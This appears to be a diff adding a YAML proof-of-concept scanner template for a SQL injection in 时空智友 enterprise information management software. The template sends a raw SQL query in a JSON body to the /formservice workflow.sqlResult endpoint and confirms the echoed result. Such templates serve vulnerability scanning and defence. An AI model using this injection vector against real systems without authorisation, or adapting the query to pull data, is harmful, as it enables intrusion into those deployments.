@@ -1,0 +1,13 @@
+name: poc-yaml-时空智友企业信息管理-sql
+description: "SQL注入"
+method: POST
+headers:
+  Content-Type: "application/json"
+body: >
+  {"params": {"a": "1"}, "sql": "select 262214"}
+path:
+  - /formservice?service=workflow.sqlResult
+expression:
+  status: 200
+  body_all:
+    - "<root>262214</root>"
